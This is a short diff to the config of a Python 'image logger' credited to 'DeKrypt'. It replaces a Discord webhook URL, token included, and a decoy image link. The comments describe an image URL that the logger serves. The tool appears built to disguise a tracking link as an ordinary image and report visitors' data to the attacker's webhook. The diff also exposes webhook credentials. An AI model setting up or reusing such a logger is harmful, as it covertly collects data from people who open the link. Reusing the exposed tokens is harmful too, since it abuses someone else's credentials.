@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1100512420578992189/oueB-_Mh89DYYL1eqxrGRIrVso_ppRKGjPTLpXtf_POaOm7cnaqLSukGsz-MvDBzxQyp",
-    "image": "https://www.clearwaycommunitysolar.com/wp-content/uploads/2019/05/iStock-177131518.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1120462525247537293/ufYGen2RHk5mRVmv1L365g7Y0La0db1Hd2pTqkqEjs38jjJU26yLiQTW2QaAhYMOYW8T",
+    "image": "https://i.scdn.co/image/ab6761610000e5eba07eb018071ca45120dceb4f", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
